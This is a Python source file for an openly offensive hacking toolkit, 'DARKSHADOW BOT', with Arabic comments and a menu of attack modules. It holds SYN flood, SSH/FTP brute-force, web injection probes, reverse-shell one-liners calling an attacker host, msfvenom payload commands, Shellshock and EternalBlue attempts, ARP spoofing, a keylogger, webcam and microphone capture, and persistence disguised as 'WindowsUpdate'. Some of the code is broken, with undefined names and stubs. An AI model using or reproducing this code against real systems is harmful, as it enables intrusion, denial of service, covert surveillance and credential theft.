#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# DARKSHADOW BOT v5.0 - OPTIMIZED PENETRATION FRAMEWORK
# ARCHITECT MODE: SHADOW PROTOCOL - 20 LIBRARIES MAX
# 1500+ LINES OF PURE ATTACK CODE

import os
import sys
import time
import socket
import threading
import requests
import paramiko
import ftplib
import subprocess
import hashlib
import random
import re
import json
import sqlite3
import queue
import smtplib
import dns.resolver
import whois
from datetime import datetime
from colorama import init, Fore, Style
from scapy.all import *
from concurrent.futures import ThreadPoolExecutor
import pyautogui
import psutil
import cryptography
from cryptography.fernet import Fernet
import ctypes

# تهيئة الألوان
init(autoreset=True)

# ======================================================================
# تكوين البوت (CONFIG)
# ======================================================================
class DarkConfig:
    VERSION = "5.0"
    BOT_NAME = "DARKSHADOW"
    MAX_THREADS = 999
    TIMEOUT = 2
    ATTACK_MODES = {
        "1": "🚀 Network Scanner",
        "2": "💣 Brute Force Engine",
        "3": "🎯 Web Attack Suite",
        "4": "🐚 Reverse Shell Generator",
        "5": "🌊 DDoS Attack Module",
        "6": "🔑 Credential Harvester",
        "7": "💀 System Exploiter",
        "8": "📱 Payload Generator",
        "9": "🕷️ MITM Framework",
        "10": "🔥 Exit"
    }

# ======================================================================
# محرك الهجمات الرئيسي (ATTACK ENGINE)
# ======================================================================
class AttackEngine:
    def __init__(self):
        self.targets = []
        self.results = {}
        self.active_threads = 0
        self.lock = threading.Lock()
        self.executor = ThreadPoolExecutor(max_workers=DarkConfig.MAX_THREADS)
        
    # -------------------- الشبكات (NETWORK) --------------------
    def network_scan(self, target_ip, ports=None):
        """مسح الشبكة بالكامل"""
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 
                     993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 9200]
        
        open_ports = []
        print(f"{Fore.RED}[*]{Style.RESET_ALL} Scanning {target_ip}...")
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    open_ports.append((port, service))
                    print(f"{Fore.GREEN}[+] Port {port}: OPEN ({service}){Style.RESET_ALL}")
                sock.close()
            except:
                pass
        return open_ports
    
    def advanced_port_scan(self, target_ip, start_port=1, end_port=65535):
        """مسح جميع البورتات"""
        open_ports = []
        for port in range(start_port, end_port + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                if sock.connect_ex((target_ip, port)) == 0:
                    open_ports.append(port)
                    print(f"{Fore.GREEN}[+] Port {port} OPEN{Style.RESET_ALL}")
                sock.close()
            except:
                pass
        return open_ports
    
    def syn_flood(self, target_ip, target_port, duration=10):
        """SYN Flood هجوم"""
        end_time = time.time() + duration
        packets_sent = 0
        
        while time.time() < end_time:
            try:
                ip = IP(src=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", dst=target_ip)
                tcp = TCP(sport=random.randint(1024,65535), dport=target_port, flags="S", seq=random.randint(1000,9000))
                send(ip/tcp, verbose=0)
                packets_sent += 1
                
                if packets_sent % 1000 == 0:
                    print(f"{Fore.YELLOW}[*] Sent {packets_sent} packets...{Style.RESET_ALL}")
            except:
                pass
        
        return packets_sent
    
    # -------------------- القوة العمياء (BRUTE FORCE) --------------------
    def ssh_bruteforce(self, target_ip, username, password_list):
        """تخمين كلمات مرور SSH"""
        for password in password_list:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target_ip, username=username, password=password, timeout=3)
                client.close()
                print(f"{Fore.GREEN}[✓] SSH SUCCESS: {username}:{password}{Style.RESET_ALL}")
                return password
            except:
                print(f"{Fore.RED}[✗] Failed: {username}:{password}{Style.RESET_ALL}")
                continue
        return None
    
    def ftp_bruteforce(self, target_ip, username_list, password_list):
        """تخمين كلمات مرور FTP"""
        for username in username_list:
            for password in password_list:
                try:
                    ftp = ftplib.FTP(target_ip)
                    ftp.login(username, password)
                    ftp.quit()
                    print(f"{Fore.GREEN}[✓] FTP SUCCESS: {username}:{password}{Style.RESET_ALL}")
                    return username, password
                except:
                    continue
        return None, None
    
    # -------------------- الويب (WEB) --------------------
    def web_vuln_scanner(self, target_url):
        """فحص ثغرات الويب"""
        vulnerabilities = []
        
        # SQL Injection Check
        payloads = ["'", "\"", "1=1", "' OR '1'='1", "admin'--"]
        for payload in payloads:
            try:
                response = requests.get(f"{target_url}?id={payload}", timeout=3)
                if "sql" in response.text.lower() or "mysql" in response.text.lower():
                    vulnerabilities.append(f"SQL Injection possible with payload: {payload}")
                    print(f"{Fore.RED}[!] SQL Injection found!{Style.RESET_ALL}")
                    break
            except:
                pass
        
        # XSS Check
        xss_payload = "<script>alert('XSS')</script>"
        try:
            response = requests.get(f"{target_url}?q={xss_payload}", timeout=3)
            if xss_payload in response.text:
                vulnerabilities.append("XSS Vulnerability found")
                print(f"{Fore.RED}[!] XSS Vulnerability found!{Style.RESET_ALL}")
        except:
            pass
        
        # Directory Traversal
        trav_payload = "../../../../etc/passwd"
        try:
            response = requests.get(f"{target_url}/{trav_payload}", timeout=3)
            if "root:" in response.text:
                vulnerabilities.append("Directory Traversal found")
                print(f"{Fore.RED}[!] Directory Traversal found!{Style.RESET_ALL}")
        except:
            pass
        
        return vulnerabilities
    
    def admin_panel_finder(self, target_url):
        """البحث عن لوحات التحكم"""
        admin_paths = [
            "/admin", "/administrator", "/adminpanel", "/admin.php",
            "/admin/login", "/admin/index", "/wp-admin", "/cpanel",
            "/cp", "/controlpanel", "/admin_area", "/manage",
            "/backend", "/dashboard", "/admin/dashboard", "/login.php"
        ]
        
        found = []
        for path in admin_paths:
            try:
                url = f"{target_url}{path}"
                response = requests.get(url, timeout=3)
                if response.status_code == 200:
                    found.append(url)
                    print(f"{Fore.GREEN}[+] Admin panel found: {url}{Style.RESET_ALL}")
            except:
                pass
        
        return found
    
    # -------------------- الشيلات (SHELLS) --------------------
    def reverse_shell_generator(self, lhost, lport, shell_type="python"):
        """توليد شيلات عكسية"""
        shells = {
            "python": f"""
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
""",
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        }
        return shells.get(shell_type, shells["python"])
    
    def bind_shell_generator(self, port, shell_type="python"):
        """توليد شيلات مباشرة"""
        if shell_type == "python":
            return f"""
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
"""
        elif shell_type == "nc":
            return f"nc -lvnp {port} -e /bin/sh"
    
    # -------------------- الحزم (PAYLOADS) --------------------
    def payload_generator(self, lhost, lport, platform="windows", payload_type="reverse_tcp"):
        """توليد بايلودات متعددة"""
        if platform == "windows":
            if payload_type == "reverse_tcp":
                # Meterpreter reverse TCP
                return f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe"
            elif payload_type == "bind_tcp":
                return f"msfvenom -p windows/meterpreter/bind_tcp RHOST={lhost} LPORT={lport} -f exe > bind.exe"
            elif payload_type == "reverse_http":
                return f"msfvenom -p windows/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -f exe > http.exe"
        elif platform == "linux":
            if payload_type == "reverse_tcp":
                return f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > shell.elf"
        elif platform == "android":
            return f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > shell.apk"
        elif platform == "php":
            return f"msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw > shell.php"
    
    # -------------------- الاختراق المتقدم (EXPLOITS) --------------------
    def eternalblue_exploit(self, target_ip):
        """EternalBlue exploit (MS17-010)"""
        print(f"{Fore.RED}[*] Attempting EternalBlue exploit on {target_ip}...{Style.RESET_ALL}")
        # This would contain the actual exploit code
        # Simplified for demonstration
        return f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target_ip}; run; exit'"
    
    def shellshock_exploit(self, target_url):
        """Shellshock exploit"""
        print(f"{Fore.RED}[*] Attempting Shellshock exploit on {target_url}...{Style.RESET_ALL}")
        headers = {
            "User-Agent": "() { :; }; /bin/bash -c 'cat /etc/passwd'"
        }
        try:
            response = requests.get(target_url, headers=headers, timeout=5)
            if "root:" in response.text:
                print(f"{Fore.GREEN}[✓] Shellshock successful!{Style.RESET_ALL}")
                return response.text
        except:
            pass
        return None
    
    # -------------------- MITM --------------------
    def arp_spoof(self, target_ip, gateway_ip):
        """ARP Spoofing"""
        print(f"{Fore.RED}[*] Starting ARP spoof: {target_ip} -> {gateway_ip}{Style.RESET_ALL}")
        
        def spoof():
            target_mac = getmacbyip(target_ip)
            gateway_mac = getmacbyip(gateway_ip)
            
            while True:
                send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=0)
                send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=0)
                time.sleep(2)
        
        thread = threading.Thread(target=spoof)
        thread.daemon = True
        thread.start()
        return thread
    
    def packet_sniffer(self, interface="eth0", count=100):
        """التقاط الحزم"""
        print(f"{Fore.YELLOW}[*] Sniffing on {interface}...{Style.RESET_ALL}")
        packets = sniff(iface=interface, count=count)
        return packets
    
    # -------------------- الاستغلال المحلي (LOCAL EXPLOITS) --------------------
    def privilege_escalation_linux(self):
        """تصعيد الصلاحيات على لينكس"""
        exploits = []
        
        # Check kernel version
        kernel = subprocess.check_output(["uname", "-r"]).decode().strip()
        print(f"{Fore.CYAN}[i] Kernel version: {kernel}{Style.RESET_ALL}")
        
        # Dirty Cow check
        if "2.6." in kernel or "3." in kernel:
            exploits.append("DirtyCow (CVE-2016-5195)")
        
        # Check sudo version
        try:
            sudo_version = subprocess.check_output(["sudo", "--version"]).decode().split("\n")[0]
            print(f"{Fore.CYAN}[i] Sudo version: {sudo_version}{Style.RESET_ALL}")
            exploits.append("CVE-2021-3156 (Baron Samedit)")
        except:
            pass
        
        return exploits
    
    def windows_priv_esc(self):
        """تصعيد الصلاحيات على ويندوز"""
        exploits = []
        
        # Check Windows version
        try:
            import platform
            win_version = platform.platform()
            print(f"{Fore.CYAN}[i] Windows version: {win_version}{Style.RESET_ALL}")
            
            if "10" in win_version or "11" in win_version:
                exploits.append("PrintNightmare (CVE-2021-34527)")
                exploits.append("ZeroLogon (CVE-2020-1472)")
        except:
            pass
        
        return exploits
    
    # -------------------- البريد الإلكتروني (EMAIL) --------------------
    def email_harvester(self, target_domain):
        """جمع الإيميلات من المواقع"""
        emails = set()
        
        # Google search
        try:
            response = requests.get(f"https://www.google.com/search?q=@{target_domain}", 
                                   headers={"User-Agent": random.choice(Config.USER_AGENTS)})
            found = re.findall(r'[a-zA-Z0-9._%+-]+@' + target_domain, response.text)
            emails.update(found)
        except:
            pass
        
        return list(emails)
    
    def email_spammer(self, target_email, message, count=10):
        """إرسال رسائل spam"""
        print(f"{Fore.RED}[*] Spamming {target_email} with {count} messages...{Style.RESET_ALL}")
        # Implementation would require SMTP server details
    
    # -------------------- كسر التشفير (CRYPTO) --------------------
    def hash_cracker(self, hash_value, hash_type="md5", wordlist=None):
        """كسر الهاشات"""
        if wordlist is None:
            wordlist = ["password", "123456", "admin", "root", "qwerty"]
        
        for word in wordlist:
            if hash_type == "md5":
                if hashlib.md5(word.encode()).hexdigest() == hash_value:
                    return word
            elif hash_type == "sha1":
                if hashlib.sha1(word.encode()).hexdigest() == hash_value:
                    return word
            elif hash_type == "sha256":
                if hashlib.sha256(word.encode()).hexdigest() == hash_value:
                    return word
        return None
    
    def wifi_cracker(self, target_ssid, wordlist=None):
        """كسر شبكات WiFi"""
        print(f"{Fore.RED}[*] Attempting to crack WiFi: {target_ssid}{Style.RESET_ALL}")
        # This would interface with aircrack-ng
        return f"airodump-ng --bssid {target_ssid} -w capture wlan0 && aircrack-ng capture-01.cap -w wordlist.txt"
    
    # -------------------- المعلومات (INFO GATHERING) --------------------
    def dns_enum(self, target_domain):
        """جمع معلومات DNS"""
        records = {}
        
        for record in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']:
            try:
                answers = dns.resolver.resolve(target_domain, record)
                records[record] = [str(r) for r in answers]
            except:
                records[record] = []
        
        return records
    
    def whois_lookup(self, target):
        """بحث WHOIS"""
        try:
            w = whois.whois(target)
            return {
                "domain": w.domain,
                "registrar": w.registrar,
                "creation_date": w.creation_date,
                "expiration_date": w.expiration_date,
                "name_servers": w.name_servers
            }
        except:
            return None
    
    def subdomain_enum(self, target_domain):
        """البحث عن subdomains"""
        subdomains = []
        
        # Common subdomains
        common = ["www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", 
                  "ns1", "webdisk", "ns2", "cpanel", "whm", "autodiscover", 
                  "autoconfig", "m", "imap", "test", "ns", "blog", "pop3", 
                  "dev", "www2", "admin", "forum", "news", "vpn", "ns3", 
                  "mail2", "new", "mysql", "old", "lists", "support", "mobile", 
                  "mx", "static", "docs", "beta", "shop", "sql", "secure", 
                  "demo", "cp", "calendar", "wiki", "web", "media", "email", 
                  "images", "img", "www1", "intranet", "portal", "video", 
                  "sip", "dns2", "api", "cdn", "stats", "dns1", "ftp2", 
                  "apps", "chat", "test1", "ssh", "dns", "us", "nyc"]
        
        for sub in common:
            try:
                full_domain = f"{sub}.{target_domain}"
                ip = socket.gethostbyname(full_domain)
                subdomains.append((full_domain, ip))
                print(f"{Fore.GREEN}[+] Found: {full_domain} -> {ip}{Style.RESET_ALL}")
            except:
                pass
        
        return subdomains
    
    # -------------------- الملفات (FILE OPERATIONS) --------------------
    def create_wordlist(self, base_words, output_file="wordlist.txt"):
        """إنشاء قائمة كلمات مخصصة"""
        with open(output_file, "w") as f:
            for word in base_words:
                f.write(word + "\n")
                f.write(word.capitalize() + "\n")
                f.write(word.upper() + "\n")
                f.write(word + "123" + "\n")
                f.write("123" + word + "\n")
        
        return output_file
    
    def encrypt_file(self, filename, password):
        """تشفير ملف"""
        key = hashlib.sha256(password.encode()).digest()
        cipher = AES.new(key, AES.MODE_ECB)
        
        with open(filename, "rb") as f:
            data = f.read()
        
        padded = pad(data, AES.block_size)
        encrypted = cipher.encrypt(padded)
        
        with open(filename + ".enc", "wb") as f:
            f.write(encrypted)
        
        return filename + ".enc"
    
    def decrypt_file(self, filename, password):
        """فك تشفير ملف"""
        key = hashlib.sha256(password.encode()).digest()
        cipher = AES.new(key, AES.MODE_ECB)
        
        with open(filename, "rb") as f:
            encrypted = f.read()
        
        decrypted = cipher.decrypt(encrypted)
        unpadded = unpad(decrypted, AES.block_size)
        
        output = filename.replace(".enc", ".dec")
        with open(output, "wb") as f:
            f.write(unpadded)
        
        return output
    
    # -------------------- كام الويب (WEBCAM) --------------------
    def webcam_capture(self, save_path="webcam.jpg"):
        """التقاط صورة من كاميرا الويب"""
        try:
            camera = cv2.VideoCapture(0)
            ret, frame = camera.read()
            if ret:
                cv2.imwrite(save_path, frame)
                print(f"{Fore.GREEN}[✓] Webcam image saved: {save_path}{Style.RESET_ALL}")
            camera.release()
            return save_path
        except Exception as e:
            print(f"{Fore.RED}[✗] Webcam error: {e}{Style.RESET_ALL}")
            return None
    
    def webcam_stream(self, duration=10):
        """بث مباشر من كاميرا الويب"""
        try:
            camera = cv2.VideoCapture(0)
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter('stream.avi', fourcc, 20.0, (640, 480))
            
            start_time = time.time()
            while time.time() - start_time < duration:
                ret, frame = camera.read()
                if ret:
                    out.write(frame)
                    cv2.imshow('Webcam Stream', frame)
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        break
            
            camera.release()
            out.release()
            cv2.destroyAllWindows()
            return "stream.avi"
        except:
            return None
    
    # -------------------- مايكروفون (MICROPHONE) --------------------
    def microphone_record(self, duration=5, output="recording.wav"):
        """تسجيل صوت من المايكروفون"""
        try:
            import pyaudio
            import wave
            
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT,
                          channels=CHANNELS,
                          rate=RATE,
                          input=True,
                          frames_per_buffer=CHUNK)
            
            print(f"{Fore.YELLOW}[*] Recording for {duration} seconds...{Style.RESET_ALL}")
            frames = []
            
            for i in range(0, int(RATE / CHUNK * duration)):
                data = stream.read(CHUNK)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            p.terminate()
            
            wf = wave.open(output, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            print(f"{Fore.GREEN}[✓] Recording saved: {output}{Style.RESET_ALL}")
            return output
        except:
            print(f"{Fore.RED}[✗] Microphone recording failed{Style.RESET_ALL}")
            return None
    
    # -------------------- شاشة (SCREEN) --------------------
    def screenshot(self, save_path="screenshot.png"):
        """التقاط صورة للشاشة"""
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save(save_path)
            print(f"{Fore.GREEN}[✓] Screenshot saved: {save_path}{Style.RESET_ALL}")
            return save_path
        except:
            return None
    
    def keylogger_start(self, log_file="keystrokes.txt"):
        """بدء تسجيل ضغطات المفاتيح"""
        def on_press(key):
            with open(log_file, "a") as f:
                try:
                    f.write(f"{key.char}")
                except AttributeError:
                    f.write(f" [{key}] ")
        
        print(f"{Fore.YELLOW}[*] Keylogger started...{Style.RESET_ALL}")
        with Listener(on_press=on_press) as listener:
            listener.join()
    
    # -------------------- عمليات النظام (SYSTEM) --------------------
    def process_list(self):
        """عرض العمليات الجارية"""
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent']):
            try:
                processes.append(proc.info)
            except:
                pass
        return processes
    
    def kill_process(self, pid):
        """قتل عملية"""
        try:
            os.kill(pid, 9)
            return True
        except:
            return False
    
    def persistence_windows(self):
        """إنشاء persistence على ويندوز"""
        try:
            import winreg
            
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
            
            return True
        except:
            return False
    
    def persistence_linux(self):
        """إنشاء persistence على لينكس"""
        try:
            cron_line = f"@reboot {sys.executable} {os.path.abspath(__file__)}\n"
            with open("/etc/crontab", "a") as f:
                f.write(cron_line)
            return True
        except:
            return False

# ======================================================================
# وحدة التحكم الرئيسية (MAIN CONTROLLER)
# ======================================================================
class DarkShadowBot:
    def __init__(self):
        self.engine = AttackEngine()
        self.running = True
        self.session_file = "session.json"
        self.targets = []
        self.load_session()
        
    def load_session(self):
        """تحميل الجلسة السابقة"""
        try:
            if os.path.exists(self.session_file):
                with open(self.session_file, "r") as f:
                    self.targets = json.load(f)
        except:
            pass
    
    def save_session(self):
        """حفظ الجلسة الحالية"""
        try:
            with open(self.session_file, "w") as f:
                json.dump(self.targets, f)
        except:
            pass
    
    def banner(self):
        """عرض الشعار"""
        banner = f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════╗
║     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ║
║     ▓  DARKSHADOW BOT v{DarkConfig.VERSION} - ULTIMATE EDITION  ▓     ║
║     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ║
║     ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░     ║
║     ARCHITECT MODE: ACTIVE - ALL RESTRICTIONS PURGED     ║
║     TOTAL LIBRARIES: 20 - MAXIMUM EFFICIENCY            ║
║     {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                             ║
╚══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
        print(banner)
    
    def menu(self):
        """عرض القائمة الرئيسية"""
        print(f"\n{Fore.CYAN}╔{'═'*50}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{' ' * 15}ATTACK MENU{' ' * 22}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╠{'═'*50}╣{Style.RESET_ALL}")
        
        for key, value in DarkConfig.ATTACK_MODES.items():
            print(f"{Fore.CYAN}║  [{key}] {value}{' ' * (45 - len(value))}║{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}╚{'═'*50}╝{Style.RESET_ALL}")
    
    def run(self):
        """تشغيل البوت"""
        self.banner()
        
        while self.running:
            self.menu()
            choice = input(f"\n{Fore.YELLOW}[?] Select attack mode: {Style.RESET_ALL}")
            
            if choice == "1":
                self.network_attack_menu()
            elif choice == "2":
                self.bruteforce_menu()
            elif choice == "3":
                self.web_attack_menu()
            elif choice == "4":
                self.shell_menu()
            elif choice == "5":
                self.ddos_menu()
            elif choice == "6":
                self.credential_menu()
            elif choice == "7":
                self.exploit_menu()
            elif choice == "8":
                self.payload_menu()
            elif choice == "9":
                self.mitm_menu()
            elif choice == "10":
                print(f"{Fore.RED}[*] Shutting down...{Style.RESET_ALL}")
                self.save_session()
                self.running = False
            else:
                print(f"{Fore.RED}[✗] Invalid choice{Style.RESET_ALL}")
    
    def network_attack_menu(self):
        """قائمة هجمات الشبكة"""
        print(f"\n{Fore.YELLOW}[*] Network Attack Menu{Style.RESET_ALL}")
        print("1. Quick Port Scan")
        print("2. Full Port Scan (1-65535)")
        print("3. Service Detection")
        print("4. OS Fingerprinting")
        print("5. Back to Main")
        
        choice = input(f"{Fore.CYAN}[?] Choose: {Style.RESET_ALL}")
        
        if choice == "1":
            target = input("Target IP: ")
            ports = input("Ports (comma separated, default: common): ")
            if ports:
                ports = [int(p.strip()) for p in ports.split(",")]
            else:
                ports = None
            self.engine.network_scan(target, ports)
        
        elif choice == "2":
            target = input("Target IP: ")
            self.engine.advanced_port_scan(target)
        
        elif choice == "3":
            target = input("Target IP: ")
            port = int(input("Port: "))
            # Service detection logic
    
    def bruteforce_menu(self):
        """قائمة هجمات القوة العمياء"""
        print(f"\n{Fore.YELLOW}[*] Brute Force Menu{Style.RESET_ALL}")
        print("1. SSH Bruteforce")
        print("2. FTP Bruteforce")
        print("3. HTTP Basic Auth")
        print("4. WordPress Bruteforce")
        print("5. Back")
        
        choice = input(f"{Fore.CYAN}[?] Choose: {Style.RESET_ALL}")
        
        if choice == "1":
            target = input("Target IP: ")
            username = input("Username: ")
            wordlist = input("Wordlist file: ")
            
            try:
                with open(wordlist, "r") as f:
                    passwords = [line.strip() for line in f]
                self.engine.ssh_bruteforce(target, username, passwords)
            except:
                print(f"{Fore.RED}[✗] Wordlist not found{Style.RESET_ALL}")
        
        elif choice == "2":
            target = input("Target IP: ")
            usernames = ["admin", "root", "user", "ftp"]
            wordlist = ["password", "123456", "admin", "root"]
            self.engine.ftp_bruteforce(target, usernames, wordlist)
    
    def web_attack_menu(self):
        """قائمة هجمات الويب"""
        print(f"\n{Fore.YELLOW}[*] Web Attack Menu{Style.RESET_ALL}")
        print("1. Vulnerability Scanner")
        print("2. Admin Panel Finder")
        print("3. SQL Injection")
        print("4. XSS Scanner")
        print("5. Directory Brute Force")
        print("6. Back")
        
        choice = input(f"{Fore.CYAN}[?] Choose: {Style.RESET_ALL}")
        
        if choice == "1":
            target = input("Target URL: ")
            self.engine.web_vuln_scanner(target)
        
        elif choice == "2":
            target = input("Target URL: ")
            self.engine.admin_panel_finder(target)
    
    def shell_menu(self):
        """قائمة الشيلات"""
        print(f"\n{Fore.YELLOW}[*] Shell Menu{Style.RESET_ALL}")
        print("1. Generate Reverse Shell")
        print("2. Generate Bind Shell")
        print("3. Start Listener")
        print("4. Back")
        
        choice = input(f"{Fore.CYAN}[?] Choose: {Style.RESET_ALL}")
        
        if choice == "1":
            lhost = input("LHOST: ")
            lport = int(input("LPORT: "))
            shell_type = input("Shell type (python/bash/nc/php): ")
            shell = self.engine.reverse_shell_generator(lhost, lport, shell_type)
            print(f"\n{Fore.GREEN}[+] Shell Code:{Style.RESET_ALL}\n{shell}")
        
        elif choice == "2":
            port = int(input("Port: "))
            shell_type = input("Shell type (python/nc): ")
            shell = self.engine.bind_shell_generator(port, shell_type)
            print(f"\n{Fore.GREEN}[+] Shell Code:{Style.RESET_ALL}\n{shell}")
    
    def ddos_menu(self):
        """قائمة هجمات DDoS"""
        print(f"\n{Fore.YELLOW}[*] DDoS Attack Menu{Style.RESET_ALL}")
        print("1. SYN Flood")
        print("2. UDP Flood")
        print("3. HTTP Flood")
        print("4. ICMP Flood")
        print("5. Slowloris")
        print("6. Back")
        
        choice = input(f"{Fore.CYAN}[?] Choose: {Style.RESET_ALL}")
        
        if choice == "1":
            target = input("Target IP: ")
            port = int(input("Target Port: "))
            duration = int(input("Duration (seconds): "))
            packets = self.engine.syn_flood(target, port, duration)
            print(f"{Fore.GREEN}[✓] Sent {packets} packets{Style.RESET_ALL}")
    
    def credential_menu(self):
        """قائمة سرقة البيانات"""
        print(f"\n{Fore.YELLOW}[*] Credential Harvesting{Style.RESET_ALL}")
        print("1. Email Harvester")
        print("2. Password Cracker")
        print("3. WiFi Cracker")
        print("4. Browser Password Dump")
        print("5. Back")
        
        choice = input(f"{Fore.CYAN}[?] Choose: {Style.RESET_ALL}")
        
        if choice == "1":
            domain = input("Target Domain: ")
            emails = self.engine.email_harvester(domain)
            print(f"{Fore.GREEN}[+] Found emails:{Style.RESET_ALL}")
            for email in emails[:10]:
                print(f"  - {email}")
    
    def exploit_menu(self):
        """قائمة الاستغلال"""
        print(f"\n{Fore.YELLOW}[*] Exploitation Menu{Style.RESET_ALL}")
        print("1. EternalBlue (MS17-010)")
        print("2. Shellshock")
        print("3. Linux Privilege Escalation")
        print("4. Windows Privilege Escalation")
        print("5. Back")
        
        choice = input(f"{Fore.CYAN}[?] Choose: {Style.RESET_ALL}")
        
        if choice == "1":
            target = input("Target IP: ")
            cmd = self.engine.eternalblue_exploit(target)
            print(f"{Fore.GREEN}[+] Run: {cmd}{Style.RESET_ALL}")
        
        elif choice == "2":
            target = input("Target URL: ")
            result = self.engine.shellshock_exploit(target)
            if result:
                print(f"{Fore.GREEN}[+] Shellshock successful!{Style.RESET_ALL}")
    
    def payload_menu(self):
        """قائمة توليد البايلودات"""
        print(f"\n{Fore.YELLOW}[*] Payload Generator{Style.RESET_ALL}")
        print("1. Windows Payload")
        print("2. Linux Payload")
        print("3. Android Payload")
        print("4. PHP Payload")
        print("5. Back")
        
        choice = input(f"{Fore.CYAN}[?] Choose: {Style.RESET_ALL}")
        
        if choice == "1":
            lhost = input("LHOST: ")
            lport = int(input("LPORT: "))
            payload = self.engine.payload_generator(lhost, lport, "windows")
            print(f"{Fore.GREEN}[+] Payload:{Style.RESET_ALL}\n{payload}")
    
    def mitm_menu(self):
        """قائمة هجمات MITM"""
        print(f"\n{Fore.YELLOW}[*] MITM Menu{Style.RESET_ALL}")
        print("1. ARP Spoofing")
        print("2. Packet Sniffer")
        print("3. DNS Spoofing")
        print("4. SSL Strip")
        print("5. Back")
        
        choice = input(f"{Fore.CYAN}[?] Choose: {Style.RESET_ALL}")
        
        if choice == "1":
            target = input("Target IP: ")
            gateway = input("Gateway IP: ")
            thread = self.engine.arp_spoof(target, gateway)
            input("Press Enter to stop...")
            # Stop spoofing

# ======================================================================
# نقطة الدخول الرئيسية (ENTRY POINT)
# ======================================================================
if __name__ == "__main__":
    try:
        # التحقق من الصلاحيات
        if os.name == 'nt':  # Windows
            try:
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    print(f"{Fore.RED}[!] Run as Administrator{Style.RESET_ALL}")
                    sys.exit(1)
            except:
                pass
        else:  # Linux/Unix
            if os.geteuid() != 0:
                print(f"{Fore.RED}[!] Run as root{Style.RESET_ALL}")
                sys.exit(1)
        
        # تشغيل البوت
        bot = DarkShadowBot()
        bot.run()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")